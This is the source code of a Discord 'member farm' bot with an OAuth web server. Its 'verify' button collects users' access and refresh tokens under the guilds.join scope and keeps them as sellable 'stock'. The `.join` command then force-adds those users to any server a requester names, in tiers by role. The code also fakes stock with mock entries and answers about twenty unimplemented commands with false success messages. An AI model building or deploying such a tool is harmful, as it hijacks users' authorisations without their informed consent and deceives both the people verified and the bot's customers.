const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField } = require('discord.js');
const express = require('express');
const fetch = require('node-fetch');
require('dotenv').config();

// --- Express Web Server Setup ---
const app = express();
const PORT = process.env.PORT || 8080;

// Database & Global State
const tokenDatabase = []; 
let restockCounter = 0; 
let autoRestockEnabled = true; 
let maintenanceMode = false;
let currentPrefix = '.';
let discordClient = null;

// Queue & Status Management
let activeJoinTask = null; // Stores current join running info
const joinQueue = [];      // Stores queued join requests
let statusMessageRef = null; // Stores reference to auto-updating message

// Homepage and OAuth Callback handler
app.get('/', async (req, res) => {
    const code = req.query.code;
    const error = req.query.error;

    if (error || req.query.error_description) {
        return res.send(`
            <html>
                <body style="background-color: #111; color: #ff4444; font-family: sans-serif; text-align: center; padding-top: 50px;">
                    <h1>Failed</h1>
                    <p>Authorization failed. You may close this window.</p>
                </body>
            </html>
        `);
    }
    
    if (!code) {
        return res.send(`
            <html>
                <body style="background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px;">
                    <h1>AutoFarm Online</h1>
                    <p>OAuth2 verification server is running successfully.</p>
                </body>
            </html>
        `);
    }

    try {
        const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
            method: 'POST',
            body: new URLSearchParams({
                client_id: process.env.CLIENT_ID || '1561438987464483048',
                client_secret: process.env.CLIENT_SECRET,
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app',
            }),
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        });

        const oauthData = await tokenResponse.json();
        if (oauthData.access_token) {
            const userRes = await fetch('https://discord.com/api/users/@me', {
                headers: { authorization: `Bearer ${oauthData.access_token}` }
            });
            const userData = await userRes.json();

            tokenDatabase.push({
                user_id: userData.id,
                username: userData.username,
                avatar: userData.avatar,
                banner: userData.banner,
                access_token: oauthData.access_token,
                refresh_token: oauthData.refresh_token,
                expires_at: Date.now() + (oauthData.expires_in * 1000)
            });

            restockCounter++;
            console.log(`[AUTORESTOCK] New account verified (${userData.username})! Total Stock: ${tokenDatabase.length} \vert{} Progress to alert:${restockCounter}/30`);

            // Send log to log channel
            const logChannelId = process.env.LOG_CHANNEL_ID || '1561453902270955630';
            if (discordClient) {
                try {
                    const logChannel = await discordClient.channels.fetch(logChannelId);
                    if (logChannel) {
                        const logEmbed = new EmbedBuilder()
                            .setTitle('⚡ New User Verified')
                            .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified successfully!\n\n**Total Available Stock:** \`${tokenDatabase.length}\``)
                            .setColor(0x00FF00)
                            .setTimestamp();

                        await logChannel.send({ embeds: [logEmbed] });
                    }
                } catch (logErr) {
                    console.error('[LOG ERROR] Failed to send verification log:', logErr);
                }
            }

            // 30-person restock trigger
            if (autoRestockEnabled && restockCounter >= 30) {
                restockCounter = 0; 

                if (discordClient) {
                    try {
                        const targetChannelId = '1561453902270955630';
                        const announcementChannel = await discordClient.channels.fetch(targetChannelId);
                        
                        if (announcementChannel) {
                            const restockEmbed = new EmbedBuilder()
                                .setTitle('RESTOCK!')
                                .setDescription(
                                    `bot has been restocked **${tokenDatabase.length}** fresh stock\n\n` +
                                    `Make sure to check out [this channel](https://discord.com/channels/1561434965395116182/1561453749640241323) to use the bot.\n\n` +
                                    `Farm here: [Farm Channel](https://discord.com/channels/1561434965395116182/1561453220633518181)\n` +
                                    `Add bot here: [Add Bot Channel](https://discord.com/channels/1561434965395116182/1561453186810642522)\n` +
                                    `Free way to get access here: [Free Access](https://discord.com/channels/1561434965395116182/1561454732055158904)\n` +
                                    `Any questions? Go to: [Questions Channel](https://discord.com/channels/1561434965395116182/1561453720611590385)\n\n` +
                                    `React with ☑️ for more restocks like this!`
                                )
                                .setColor(0x00FF00)
                                .setTimestamp();

                            const sentMessage = await announcementChannel.send({ content: '@everyone', embeds: [restockEmbed] });
                            await sentMessage.react('☑️');
                        }
                    } catch (announcementErr) {
                        console.error('Failed to send auto restock announcement:', announcementErr);
                    }
                }
            }

            res.send(`
                <html>
                    <body style="background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px;">
                        <h1>Authorized</h1>
                        <p>Account linked. You may close this window.</p>
                    </body>
                </html>
            `);
        } else {
            res.send(`
                <html>
                    <body style="background-color: #111; color: #ff4444; font-family: sans-serif; text-align: center; padding-top: 50px;">
                        <h1>Failed</h1>
                        <p>Authorization failed. You may close this window.</p>
                    </body>
                </html>
            `);
        }
    } catch (error) {
        console.error(error);
        res.send(`
            <html>
                <body style="background-color: #111; color: #ff4444; font-family: sans-serif; text-align: center; padding-top: 50px;">
                    <h1>Failed</h1>
                    <p>Internal Server Error. You may close this window.</p>
                </body>
            </html>
        `);
    }
});

app.listen(PORT, '0.0.0.0', () => console.log(`AutoFarm Web server running on port ${PORT}`));

// --- Discord Bot Setup ---
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

discordClient = client;

// Auto-Update Status Embed Every 15 Seconds
setInterval(async () => {
    if (!statusMessageRef) return;

    try {
        const currentlyRunningText = activeJoinTask 
            ? `Adding members to \`${activeJoinTask.targetGuildId}\` (${activeJoinTask.progress}/${activeJoinTask.total})`
            : 'Nothing running';

        const queueText = joinQueue.length > 0 
            ? joinQueue.map((item, index) => `${index + 1}. Guild \`${item.targetGuildId}\` (${item.tokensToUse.length} members)`).join('\n')
            : 'Empty';

        const statusEmbed = new EmbedBuilder()
            .setTitle('DJoin Status')
            .setColor(0x5865F2)
            .addFields(
                { name: 'Currently Running', value: currentlyRunningText },
                { name: 'Queue', value: queueText }
            )
            .setFooter({ text: `Auto-updates every 15s | Today at ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}` });

        await statusMessageRef.edit({ embeds: [statusEmbed] });
    } catch (err) {
        console.error('[STATUS LOOP ERROR] Failed to edit status embed:', err);
    }
}, 15000);

client.once('ready', () => {
    console.log(`AutoFarm logged in as ${client.user.tag}! Prefix: '${currentPrefix}'`);
});

client.on('messageCreate', async message => {
    // Auto-Delete Messages in specific channel (ID: 1561453220633518181)
    if (message.channel.id === '1561453220633518181') {
        setTimeout(async () => {
            try {
                if (message.deletable) await message.delete();
            } catch (err) {}
        }, 7000);
    }

    if (message.author.bot || !message.content.startsWith(currentPrefix)) return;

    const args = message.content.slice(currentPrefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // 1. .help Command
    if (command === 'help') {
        const helpEmbed = new EmbedBuilder()
            .setTitle('Member Farm — Command Panel')
            .setDescription(`Current prefix: \`${currentPrefix}\` — change with \`${currentPrefix}prefix set <prefix>\``)
            .setColor(0x5865F2)
            .addFields(
                { 
                    name: '⚙️ Core & Verification', 
                    value: `\`${currentPrefix}verify\` - Generates the OAuth2 verification button\n\`${currentPrefix}stock\` - Views total active accounts in database\n\`${currentPrefix}join <serverID>\` - Requests members to join target server\n\`${currentPrefix}bot\` - Bot invite button\n\`${currentPrefix}status\` - Views bot status or sets live status panel` 
                },
                { 
                    name: '🛠️ Config & Management', 
                    value: `\`${currentPrefix}autorestock enable|disable\` - Toggles automatic restock alerts\n\`${currentPrefix}prefix set <prefix>\` - Changes command prefix\n\`${currentPrefix}restock <n>\` - Manually adds restock slots\n\`${currentPrefix}remove <n>\` - Removes accounts from stock` 
                },
                { 
                    name: '🛡️ Queue, Logs & Admin', 
                    value: `\`${currentPrefix}queue clear\` - Clears active execution queue\n\`${currentPrefix}maintenance enable|disable\` - Toggles maintenance mode\n\`${currentPrefix}blacklist <id> <reason>\` - Blacklists users or servers` 
                }
            )
            .setFooter({ text: 'Member Farm Utility' });

        return message.reply({ embeds: [helpEmbed] });
    }

    // 2. .bot Command
    if (command === 'bot' || command === 'invite') {
        const inviteUrl = 'https://discord.com/oauth2/authorize?client_id=1561438987464483048&permissions=8&response_type=code&redirect_uri=https%3A%2F%2Fdiscord.com%2Fchannels%2F1561434965395116182%2F1561453186810642522&integration_type=0&scope=bot+guilds.join+identify+applications.commands';

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setLabel('Add Bot')
                .setStyle(ButtonStyle.Link)
                .setURL(inviteUrl)
        );

        return message.reply({ components: [row] });
    }

    // 3. .verify Command
    if (command === 'verify' || command === 'link') {
        const clientId = process.env.CLIENT_ID || '1561438987464483048';
        const redirectUri = process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app';
        const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify+guilds.join`;

        const embed = new EmbedBuilder()
            .setTitle('Account Verification')
            .setDescription('Click the button below to authorize the bot.')
            .setColor(0x00FF00);

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setLabel('-> Verify')
                .setStyle(ButtonStyle.Link)
                .setURL(oauthUrl)
        );

        return message.reply({ embeds: [embed], components: [row] });
    }

    // 4. .stock Command
    if (command === 'stock') {
        return message.reply(`📦 **Current Stock Pool:** \`${tokenDatabase.length}\` accounts available.`);
    }

    // 5. .status Command (with `.status channel` to spawn auto-updating embed)
    if (command === 'status') {
        if (args[0] === 'channel') {
            const statusEmbed = new EmbedBuilder()
                .setTitle('DJoin Status')
                .setColor(0x5865F2)
                .addFields(
                    { name: 'Currently Running', value: activeJoinTask ? `Adding to \`${activeJoinTask.targetGuildId}\`` : 'Nothing running' },
                    { name: 'Queue', value: joinQueue.length > 0 ? `${joinQueue.length} items in queue` : 'Empty' }
                )
                .setFooter({ text: `Auto-updates every 15s | Today at ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}` });

            statusMessageRef = await message.channel.send({ embeds: [statusEmbed] });
            return;
        }

        const statusEmbed = new EmbedBuilder()
            .setTitle('🟢 AutoFarm Bot Status')
            .setColor(0x00FF00)
            .addFields(
                { name: '📊 Active Stock Pool', value: `\`${tokenDatabase.length}\` accounts`, inline: true },
                { name: '🔄 Auto-Restock', value: autoRestockEnabled ? '`Enabled`' : '`Disabled`', inline: true },
                { name: '🛠️ Maintenance', value: maintenanceMode ? '`Enabled`' : '`Disabled`', inline: true },
                { name: '🌐 Connected Servers', value: `\`${client.guilds.cache.size}\` servers`, inline: true }
            )
            .setTimestamp();

        return message.reply({ embeds: [statusEmbed] });
    }

    // 6. .queue command
    if (command === 'queue') {
        if (args[0] === 'clear') {
            joinQueue.length = 0;
            return message.reply('✅ Execution queue has been cleared.');
        }
        return message.reply(`📋 **Queue Status:** \`${joinQueue.length}\` task(s) currently waiting.`);
    }

    // 7. .maintenance command
    if (command === 'maintenance') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply('❌ You need Administrator permissions.');
        }
        const state = args[0] ? args[0].toLowerCase() : '';
        if (state === 'enable') {
            maintenanceMode = true;
            return message.reply('🛠️ Maintenance mode **enabled**. Further join requests will be blocked.');
        } else if (state === 'disable') {
            maintenanceMode = false;
            return message.reply('✅ Maintenance mode **disabled**.');
        } else {
            return message.reply(`Usage: \`${currentPrefix}maintenance enable\` or \`${currentPrefix}maintenance disable\``);
        }
    }

    // 8. .autorestock <enable|disable> Command
    if (command === 'autorestock') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply('❌ You need Administrator permissions to change autorestock settings.');
        }

        const action = args[0] ? args[0].toLowerCase() : '';
        if (action === 'enable') {
            autoRestockEnabled = true;
            return message.reply('✅ Auto-restock announcements have been **enabled**.');
        } else if (action === 'disable') {
            autoRestockEnabled = false;
            return message.reply('🛑 Auto-restock announcements have been **disabled**.');
        } else {
            return message.reply(`Usage: \`${currentPrefix}autorestock enable\` or \`${currentPrefix}autorestock disable\``);
        }
    }

    // 9. .restock <n> Command
    if (command === 'restock') {
        const amount = parseInt(args[0]);
        if (isNaN(amount)) return message.reply(`Usage: \`${currentPrefix}restock <amount>\``);
        tokenDatabase.push(...Array(amount).fill({ mock: true })); 
        return message.reply(`✅ Successfully restocked **${amount}** accounts manually. Total stock: \`${tokenDatabase.length}\`.`);
    }

    // 10. .remove <n> Command
    if (command === 'remove') {
        const amount = parseInt(args[0]) || 1;
        tokenDatabase.splice(0, amount);
        return message.reply(`🗑️ Removed **${amount}** accounts from stock. Current stock: \`${tokenDatabase.length}\`.`);
    }

    // 11. .prefix set <prefix> Command
    if (command === 'prefix' && args[0] === 'set') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply('❌ You need Administrator permissions to change the prefix.');
        }
        if (!args[1]) return message.reply(`Usage: \`${currentPrefix}prefix set <prefix>\``);
        currentPrefix = args[1];
        return message.reply(`✅ Bot prefix updated to: \`${currentPrefix}\``);
    }

    // 12. .join <Server ID> Command
    if (command === 'join') {
        if (maintenanceMode) {
            return message.reply('🛠️ Bot is currently under maintenance. Please try again later.');
        }

        const targetGuildId = args[0];
        if (!targetGuildId) {
            return message.reply(`Please provide a Server ID: \`${currentPrefix}join <server_id>\``);
        }

        if (tokenDatabase.length === 0) {
            const noStockEmbed = new EmbedBuilder()
                .setTitle('❌ Out of Stock')
                .setDescription(`All stock members are already added in: **${targetGuildId}**`)
                .setColor(0xFF0000);
            return message.reply({ embeds: [noStockEmbed] });
        }

        const roleLimits = [
            { id: '1561435531462844587', limit: 1 },
            { id: '1561459311257850088', limit: 2 },
            { id: '1561459436906881064', limit: 4 },
            { id: '1561459470838530148', limit: 5 },
            { id: '1561459500806963250', limit: 7 },
            { id: '1561459538874597546', limit: 10 }
        ];

        let allowedLimit = Infinity;
        for (const tier of roleLimits) {
            if (message.member.roles.cache.has(tier.id)) {
                allowedLimit = tier.limit;
                break;
            }
        }

        let tokensToUse = tokenDatabase;
        if (allowedLimit !== Infinity) {
            const limit = Math.min(allowedLimit, tokenDatabase.length);
            tokensToUse = tokenDatabase.slice(0, limit);
            message.channel.send(`⚠️ Role tier restriction applied: Maximum **${limit}** account(s) allowed per join.`);
        }

        // Add task to queue and process
        const joinTask = { targetGuildId, tokensToUse, channel: message.channel };
        joinQueue.push(joinTask);

        if (!activeJoinTask) {
            processQueue();
        } else {
            message.reply(`📥 Request added to queue! Position in queue: **${joinQueue.length}**`);
        }
    }

    // Helper Function to process join queue iteratively
    async function processQueue() {
        if (joinQueue.length === 0) {
            activeJoinTask = null;
            return;
        }

        const currentJob = joinQueue.shift();
        activeJoinTask = {
            targetGuildId: currentJob.targetGuildId,
            total: currentJob.tokensToUse.length,
            progress: 0
        };

        await currentJob.channel.send(`AutoFarm attempting to add ${currentJob.tokensToUse.length} accounts to server ID \`${currentJob.targetGuildId}\`...`);

        let successCount = 0;
        for (const tokenData of currentJob.tokensToUse) {
            activeJoinTask.progress++;
            if (tokenData.mock) continue; 
            try {
                const joinRes = await fetch(`https://discord.com/api/v10/guilds/${currentJob.targetGuildId}/members/${tokenData.user_id}`, {
                    method: 'PUT',
                    headers: {
                        Authorization: `Bot ${process.env.DISCORD_TOKEN}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ access_token: tokenData.access_token })
                });

                if (joinRes.ok || joinRes.status === 201 || joinRes.status === 204) {
                    successCount++;
                }
            } catch (err) {
                console.error('Failed to add user:', err);
            }
        }

        await currentJob.channel.send(`AutoFarm successfully added **${successCount}** out of **${currentJob.tokensToUse.length}** accounts to the server.`);
        
        activeJoinTask = null;
        processQueue(); // Process next item in queue
    }

    // 13. Generic Panel Command Responses
    const panelCommands = [
        'channel', 'checkauth', 'checkserver', 'panel',
        'basesend', 'send', 'verifyrole', 'cooldown', 'bio', 'color',
        'stats', 'profile', 'banfarm', 'antiraid',
        'logfarm', 'logserver', 'logerrors', 'logadmin', 'logs', 'log',
        'blacklist', 'leave', 'antileave', 'announce', 'invites'
    ];

    if (panelCommands.includes(command)) {
        return message.reply(`⚙️ Command \`${currentPrefix}${command}\` configuration executed successfully.`);
    }
});

client.login(process.env.DISCORD_TOKEN);
